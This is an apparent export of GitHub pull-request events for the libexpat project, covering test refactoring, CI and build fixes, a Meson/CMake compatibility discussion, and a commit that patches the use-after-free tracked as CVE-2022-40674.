628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move (some) external entity UTF16 encoding tests out of runtests.c,"{""sha"": ""3037ca5a9a66a7501485195a0c54a2b9244fa655"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T15:53:24Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move the first batch of PI tests out of runtests.c,"{""sha"": ""73f4e3dff84db73c53605ab8a5ca6ab1d7317555"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T14:20:05Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move more (mostly UTF16) tests out of runtests.c,"{""sha"": ""189b88e811ac617eb227c4b28272bbc6b5174d82"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T16:18:22Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move fail-on-command allocators to tests/common.c,"{""sha"": ""70b69ee210f420233730bc442834fcbb2caa83cf"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T13:12:28Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move more encoding tests out of runtests.c,"{""sha"": ""552fb3c9b259e3aed833b951c9a7cfe6d7ec7fe9"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T16:04:47Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move remaining namespace tests from runtests.c to ns_tests.c,"{""sha"": ""733c7bc9e43b7d226328f36089b1bac0f8e5f147"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T16:46:28Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move test_start_ns_clears_start_element() out of runtests.c,"{""sha"": ""9e801e6bc76b52f92b75453d109a60a213d5db3b"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T16:38:11Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Fix formatting issues,"{""sha"": ""8e9b9289016717bfa56a5a3ed092c6aa5cde5aad"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T16:47:01Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,"Move first namespace tests out of runtests.c to new ns_tests.c

These two tests need to be moved together because test_ns_parser_reset()
calls test_return_ns_triplet(), and the START_TEST macro defines test
functions to be static.","{""sha"": ""4d578a0e0c212088ac7b671b574f22eb91b98ab6"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T16:27:47Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move namespace setup and teardown test functions to tests/common.c,"{""sha"": ""1f2463bcc361d431cb7ea8baf30095277fcac94c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T15:42:26Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Fix formatting issues before pushing,"{""sha"": ""d31f13b3f2f4b0a07d055439c865e7809cd262e3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T17:01:04Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move remaining basic tests from runtests.c to basic_tests.c,"{""sha"": ""5c75317f2ec9413fb22b7583f3d61b934d6f3ac5"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T16:28:15Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move namespace tagname tests out of runtests.c,"{""sha"": ""4ebf563a18ca920b002c27bc0b87d121313344f7"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-04T16:35:19Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 13:15:38,RMJ10,fork_close,Apply clang-conformant formatting,"{""sha"": ""a8661fb3268d6962a4612fe4304796f28625651f"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T13:15:38Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T13:15:38Z""}}"
628,SubmitCommit,2022-08-15 13:44:01,RMJ10,fork_close,Mark suite unused in non-XML_DTD case of make_accounting_test_case,"{""sha"": ""2191356df5ee4165d49d6fcf48553259b509af29"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T13:44:01Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T13:44:01Z""}}"
628,OpenPR,2022-08-15 15:40:48,RMJ10,fork_close,,
628,Revise,2022-08-24 15:23:24,RMJ10,fork_close,Include expat_config.h in the support files for constants,"{""sha"": ""f867d5ae58b1bceee142e88930fc464f9097366b"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-24T15:23:24Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-24T15:23:24Z""}}"
628,HeadRefForcePushed,2022-08-24 15:24:10,RMJ10,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7252013496"", ""commit_url"": null}"
628,ClosePR,2022-11-01 16:20:27,RMJ10,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7714988316"", ""commit_url"": null}"
628,IssueCommentSupplement,2022-11-01 16:20:27,RMJ10,fork_close,Superceded by  PR #674,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1298783029"", ""author_association"": ""CONTRIBUTOR""}"
629,SubmitCommit,2022-08-17 17:26:18,RMJ10,fork_merge,"Ensure raw tagnames are safe exiting internalEntityParser

It is possible to concoct a situation in which parsing is
suspended while substituting in an internal entity, so that
XML_ResumeParser directly uses internalEntityProcessor as
its processor.  If the subsequent parse includes some unclosed
tags, this will return without calling storeRawNames to ensure
that the raw versions of the tag names are stored in memory other
than the parse buffer itself.  If the parse buffer is then changed
or reallocated (for example if processing a file line by line),
badness will ensue.

This patch ensures storeRawNames is always called when needed
after calling doContent.  The earlier call do doContent does
not need the same protection; it only deals with entity
substitution, which cannot leave unbalanced tags, and in any
case the raw names will be pointing into the stored entity
value not the parse buffer.","{""sha"": ""4a32da87e931ba54393d465bb77c40b5c33d343b"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-17T17:26:18Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-17T17:26:18Z""}}"
629,OpenPR,2022-08-18 13:35:03,RMJ10,fork_merge,,
629,CrossReferenced,2022-09-11 18:58:50,hartwork,fork_merge,[CVE-2022-40674] tests: Cover heap use-after-free issue in doContent (follow-up to #629),"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/640"", ""is_pull_request"": true}}"
629,ReviewApproved,2022-09-11 19:01:10,hartwork,fork_merge,@RMJ10 many thanks!,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/629#pullrequestreview-1103342562""}"
629,MergePR,2022-09-11 19:01:20,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362810576"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/dde178b976934e16526a3277d31d9fa3fab7a6c1""}"
629,Labeled,2022-09-11 19:01:28,hartwork,fork_merge,bug,
629,Labeled,2022-09-11 19:01:28,hartwork,fork_merge,security,
629,RenameTitle,2022-09-14 17:00:29,hartwork,fork_merge,,"{""rename"": {""from"": ""Ensure raw tagnames are safe exiting internalEntityParser"", ""to"": ""[CVE-2022-40674] Ensure raw tagnames are safe exiting internalEntityParser""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7387821931""}"
629,Referenced,2022-09-14 17:56:41,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7388276486"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a976e32abd257728a51dc55cf3d4ebee5b853459""}"
629,Referenced,2022-09-21 11:46:56,algitbot,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7430138778"", ""commit_url"": ""https://api.github.com/repos/alpinelinux/aports/commits/06aa1d81177d00a95baa5e61fd13b0bee0955647""}"
629,CrossReferenced,2022-10-11 11:29:38,CamberLoid,fork_merge,"expat: Multiple vulnerabilites (CVE-2022-40674, CVE-2022-43680)","{""reference"": {""url"": ""https://api.github.com/repos/AOSC-Dev/aosc-os-abbs/issues/4244"", ""is_pull_request"": false}}"
629,CrossReferenced,2022-10-11 20:53:57,cbmarcum,fork_merge,fix: use-after-free issue in doContent,"{""reference"": {""url"": ""https://api.github.com/repos/cbmarcum/libexpat/issues/4"", ""is_pull_request"": true}}"
629,CrossReferenced,2022-10-14 06:52:21,RoninBreizh,fork_merge,Incorrect Severity ranking for the same image using trivy in CLI compare to the use of trivy.dev tool,"{""reference"": {""url"": ""https://api.github.com/repos/aquasecurity/trivy/issues/3020"", ""is_pull_request"": false}}"
631,SubmitCommit,2022-08-20 14:36:13,t-0,fork_merge,issue-630: libexpat/expat/fuzz/.gitignore changed to not ignore already-committed source,"{""sha"": ""0ed8a19f38f706f995c7a997e6a3f9ea0668689f"", ""author"": {""name"": ""t-0"", ""email"": ""t-0@users.noreply.github.com"", ""date"": ""2022-08-20T14:36:13Z""}, ""committer"": {""name"": ""t-0"", ""email"": ""t-0@users.noreply.github.com"", ""date"": ""2022-08-20T14:36:13Z""}}"
631,OpenPR,2022-08-20 14:40:15,t-0,fork_merge,,
631,RenameTitle,2022-08-20 14:46:24,t-0,fork_merge,,"{""rename"": {""from"": ""issue-630"", ""to"": ""issue-630: .gitignore changed to not ignore already-committed source""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7226395138""}"
631,RenameTitle,2022-08-20 15:11:01,hartwork,fork_merge,,"{""rename"": {""from"": ""issue-630: .gitignore changed to not ignore already-committed source"", ""to"": ""File expat/fuzz/.gitignore changed to not ignore already-committed source files (fixes #630)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7226420344""}"
631,ReviewRejected,2022-08-20 15:14:18,hartwork,fork_merge,@t-0 thanks for the pull request! :+1: Please see one comment about a detail below:,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/631#pullrequestreview-1079532220""}"
631,Labeled,2022-08-20 15:15:54,hartwork,fork_merge,enhancement,
631,Revise,2022-08-20 20:02:08,t-0,fork_merge,issue-630: add requested changes from maintainer,"{""sha"": ""af044a0560d5ccd681c23a4febf115798f1b1fb6"", ""author"": {""name"": ""t-0"", ""email"": ""t-0@users.noreply.github.com"", ""date"": ""2022-08-20T20:02:08Z""}, ""committer"": {""name"": ""t-0"", ""email"": ""t-0@users.noreply.github.com"", ""date"": ""2022-08-20T20:02:08Z""}}"
631,MergePR,2022-08-20 21:37:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7226853175"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/0a0418faf822afcb3dc8f78143b2dbdbbd5cb4c7""}"
632,Labeled,2022-08-20 17:07:03,hartwork,unfork_merge,bug,
632,OpenPR,2022-08-20 17:07:03,hartwork,unfork_merge,,
632,Labeled,2022-08-20 17:07:03,hartwork,unfork_merge,compilation,
632,HeadRefForcePushed,2022-08-20 17:24:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7226552184"", ""commit_url"": null}"
632,RenameTitle,2022-08-20 22:18:40,hartwork,unfork_merge,,"{""rename"": {""from"": ""Fix compilation for -D__USE_MINGW_ANSI_STDIO=0 + get GitHub Actions CI off deprecated Ubuntu 18.04"", ""to"": ""[W.I.P.] Fix compilation for -D__USE_MINGW_ANSI_STDIO=0 + get GitHub Actions CI off deprecated Ubuntu 18.04""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7226898431""}"
632,RenameTitle,2022-08-27 21:39:24,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Fix compilation for -D__USE_MINGW_ANSI_STDIO=0 + get GitHub Actions CI off deprecated Ubuntu 18.04"", ""to"": ""[W.I.P.] Get GitHub Actions CI off deprecated Ubuntu 18.04""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272561737""}"
632,Revise,2022-09-08 23:46:33,hartwork,unfork_merge,"cmake: Avoid error ""windres: Command not found"" with MinGW on Ubuntu 20.04

Related:
https://gitlab.kitware.com/cmake/cmake/-/issues/20500#note_720469","{""sha"": ""80e6c69140c15e2caa4d808de0d35c8d5aaab415"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T11:34:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:46:33Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,Changes: Briefly document infra work,"{""sha"": ""0d2def4cce8e7a1bb6940720f478d5e2a16ee89f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T17:00:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,"GitHub Actions: Avoid Ubuntu 20.04 for coverage collection

.. because its MinGW GCC 9.3.0 fails to create any .gcda files
at test runtime (while that works just fine on 18.04 and 22.04).","{""sha"": ""1156ae7dca6515b386fda6c4f63b9326db1ed6b0"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T12:44:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,GitHub Actions: Pin remaining unpinned ubuntu-latest,"{""sha"": ""84bec8c72b37111f835365df6f7cf48e9c1ccc1f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T16:27:05Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,"GitHub Actions: Fix installation of 32bit Wine on Ubuntu 20.04

Same approach as https://github.com/uriparser/uriparser/pull/144","{""sha"": ""6311d5853058e9bc99b6d9f0c5e0b72bc699aea2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T13:26:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,GitHub Actions: Get off deprecated Ubuntu 18.04,"{""sha"": ""666a749f15530a66458376b6bd7ad256dfd56deb"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-19T21:51:19Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,"coverage.sh|qa.sh: Fix copying of DLLs for Wine/MinGW for Ubuntu 22.04

Ubuntu 22.04 no longer has libgcc_s_sjlj-1.dll but needs
libgcc_s_dw2-1.dll now, instead.","{""sha"": ""003ac7403f3664e788b6e758fbc21bde146de789"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T14:25:56Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,Revise,2022-09-08 23:53:05,hartwork,unfork_merge,GitHub Actions: Stop installing Clang when not used,"{""sha"": ""55ebc6d04eb1607d8fdb9c058439f08e25be0aa9"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T13:21:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-08T23:53:05Z""}}"
632,HeadRefForcePushed,2022-09-08 23:53:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7352200874"", ""commit_url"": null}"
632,HeadRefForcePushed,2022-09-09 00:59:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7352419189"", ""commit_url"": null}"
632,RenameTitle,2022-09-09 00:59:56,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Get GitHub Actions CI off deprecated Ubuntu 18.04"", ""to"": ""Get GitHub Actions CI off deprecated Ubuntu 18.04""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7352420709""}"
632,MergePR,2022-09-09 14:00:53,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7356695729"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/1cc2b29c47d0daa2fb7efcd418ddcfaa4f1833b2""}"
632,DeleteBranch,2022-09-09 14:02:34,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7356708406"", ""commit_url"": null}"
632,CrossReferenced,2023-02-08 18:57:26,hartwork,unfork_merge,Make things work for Linux,"{""reference"": {""url"": ""https://api.github.com/repos/BenPyton/OsciView/issues/2"", ""is_pull_request"": true}}"
633,SubmitCommit,2022-08-21 17:18:45,hartwork,unfork_merge,coverage.sh: Inline exclusion patterns (for upcoming change),"{""sha"": ""230b490cbf1ad525a142b5d355955de4bee0315e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-21T17:18:16Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-21T17:18:45Z""}}"
633,SubmitCommit,2022-08-21 17:22:29,hartwork,unfork_merge,coverage.sh: Exclude MinGW headers (stdio.h and stdlib.h),"{""sha"": ""9188cba7a5a14177697e05ff3ba27add3a278976"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-21T17:22:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-21T17:22:29Z""}}"
633,Labeled,2022-08-21 17:25:23,hartwork,unfork_merge,enhancement,
633,OpenPR,2022-08-21 17:25:23,hartwork,unfork_merge,,
633,MergePR,2022-08-21 18:05:37,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7228015112"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/cc3ddda56599e96c67e98df9a754698ea1ecd1f6""}"
633,DeleteBranch,2022-08-21 18:49:53,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7228057131"", ""commit_url"": null}"
633,Referenced,2022-09-15 15:05:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915720"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
633,Referenced,2022-09-19 14:22:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155038"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
634,SubmitCommit,2022-08-27 21:37:04,hartwork,unfork_merge,lib: Fix compilation for -D__USE_MINGW_ANSI_STDIO=0,"{""sha"": ""446688c6caae4f8772355acd32fb4bff4354d572"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-20T15:54:48Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-27T21:37:04Z""}}"
634,Labeled,2022-08-27 21:38:59,hartwork,unfork_merge,bug,
634,Labeled,2022-08-27 21:38:59,hartwork,unfork_merge,windows,
634,OpenPR,2022-08-27 21:38:59,hartwork,unfork_merge,,
634,MergePR,2022-08-27 22:35:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272600352"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/fff6ef4c8769320c189beb44329bfab0cf257d8d""}"
634,DeleteBranch,2022-08-27 22:36:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272600879"", ""commit_url"": null}"
635,SubmitCommit,2022-08-27 21:40:24,hartwork,unfork_merge,coverage.sh: Fix name collision for -funsigned-char,"{""sha"": ""6225970379576d271c2c0170aedb00be030a6c3d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-21T19:15:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-27T21:40:24Z""}}"
635,OpenPR,2022-08-27 21:41:43,hartwork,unfork_merge,,
635,MergePR,2022-08-27 23:34:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272637663"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/0b826ea2027dad6d0ceb268fe5d94bd63da02c2e""}"
635,DeleteBranch,2022-08-27 23:34:57,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272637827"", ""commit_url"": null}"
635,Referenced,2022-09-15 15:05:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915730"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
635,Referenced,2022-09-19 14:22:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155043"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
636,OpenPR,2022-08-27 21:48:00,neheb,fork_merge,,
636,ReviewComment,2022-08-27 21:53:51,hartwork,fork_merge,Hi @neheb CI will likely reject this PR due to the code at https://github.com/libexpat/libexpat/blob/cc3ddda56599e96c67e98df9a754698ea1ecd1f6/expat/apply-clang-format.sh#L59 . Can you help me understand how Meson is part of the picture with this file written for CMake? Thanks! ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/636#pullrequestreview-1087722667""}"
636,IssueComment,2022-08-27 22:15:28,hartwork,fork_merge,@neheb I think I found at https://github.com/mesonbuild/meson/blob/28dff2ca6d71b22765d9eb78719bd0b6c3b55dee/mesonbuild/mesonlib/universal.py#L1222 what you are referring to.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1229277976"", ""author_association"": ""MEMBER""}"
636,ReviewRejected,2022-08-27 22:31:25,hartwork,fork_merge,"@neheb my impression is that:
- `clang-format` produces line `#<space><space>cmakedefine XML_DEV_URANDOM` originally
- `apply-clang-format.sh` then replaces `#<space><space>` by `<space><space>#` for CMake itself to find `#cmakedefine` in one piece.

So if Meson only understands `#cmakedefine` [at the start of the line](https://github.com/mesonbuild/meson/blob/master/mesonbuild/mesonlib/universal.py#L1222) and we do want to work around it then:
- we need to patch the `#cmakedefine` line in file `expat_config.h.cmake`
- we need to patch post-processing in `apply-clang-format.sh` to just drop those two spaces rather than moving them around

I must admit, it feels ""wrong"" to me to fix CMake things that are valid for CMake itself that only Meson fails to understand. Can you please fix that in Meson upstream, too? Fixing it here can be a workaround of value, but does not fix the actual problem. What do you think?

Best, Sebastian","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/636#pullrequestreview-1087761409""}"
636,RenameTitle,2022-08-27 22:40:06,hartwork,fork_merge,,"{""rename"": {""from"": ""remove leading whitespace from config file"", ""to"": ""CMake: Drop leading whitespace from a #cmakedefine line in file expat_config.h.cmake to workaround issues with Meson""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272603878""}"
636,IssueComment,2022-08-27 22:54:59,neheb,fork_merge,"I mean given that whitespace is a stylistic issue, I don't think it's a big problem.

Fixing meson is fine, but that would unnecessarily increase the minimum required version and leave a bunch of old OSes unsupported.

I'll look into clang-format.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1229284619"", ""author_association"": ""CONTRIBUTOR""}"
636,HeadRefForcePushed,2022-08-27 23:10:39,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272623577"", ""commit_url"": null}"
636,HeadRefForcePushed,2022-08-27 23:15:04,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272626370"", ""commit_url"": null}"
636,HeadRefForcePushed,2022-08-27 23:18:52,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272628712"", ""commit_url"": null}"
636,Revise,2022-08-27 23:25:49,neheb,fork_merge,"remove leading whitespace from config file

meson has a bug where #cmakedefine with leading whitespace is not transformed.","{""sha"": ""2e4ff883f165e55fbcceb0087a789fced0805e41"", ""author"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-08-27T21:47:56Z""}, ""committer"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-08-27T23:25:49Z""}}"
636,HeadRefForcePushed,2022-08-27 23:25:59,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7272633089"", ""commit_url"": null}"
636,ReviewApproved,2022-08-27 23:36:21,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/636#pullrequestreview-1087781966""}"
636,IssueComment,2022-08-27 23:42:34,hartwork,fork_merge,@neheb FYI I have restarted the failed CI run. And pull request #638 should help make failure like that happen less often.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1229338739"", ""author_association"": ""MEMBER""}"
636,IssueComment,2022-08-28 04:33:10,eli-schwartz,fork_merge,"> I must admit, it feels ""wrong"" to me to fix CMake things that are valid for CMake itself that only Meson fails to understand. Can you please fix that in Meson upstream, too? Fixing it here can be a workaround of value, but does not fix the actual problem. What do you think?

I guess it would also be nice if there was a formal specification for what, exactly, cmake actually does. There are several issues with fully implementing cmake compatibility, and Meson also doesn't properly handle values passed to cmakedefines (with full replacement capabilities, but ONLY if the variable is considered a boolean truth by... `if()`).

